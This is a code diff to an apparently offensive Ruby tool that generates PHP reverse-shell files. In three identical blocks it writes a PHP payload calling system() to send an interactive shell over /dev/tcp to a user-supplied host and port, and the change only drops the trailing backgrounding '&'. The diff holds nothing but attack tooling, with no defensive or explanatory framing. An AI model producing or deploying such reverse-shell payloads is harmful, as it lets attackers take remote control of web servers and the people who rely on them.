@@ -64,7 +64,7 @@ if File.directory? file
             sleep(0.5)
             open(file, 'w') { |f|
                 f.puts "<?php"
-                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
                 f.puts "?>"
             }
             puts "#{s}Saved to #{file}!"
@@ -77,7 +77,7 @@ if File.directory? file
             sleep(0.5)
             open(file, 'w') { |f|
                 f.puts "<?php"
-                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
                 f.puts "?>"
             }
             puts "#{s}Saved to #{file}!"
@@ -104,7 +104,7 @@ else
             sleep(0.5)
             open(file, 'w') { |f|
                 f.puts "<?php"
-                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
                 f.puts "?>"
             }
             puts "#{s}Saved to #{file}!"
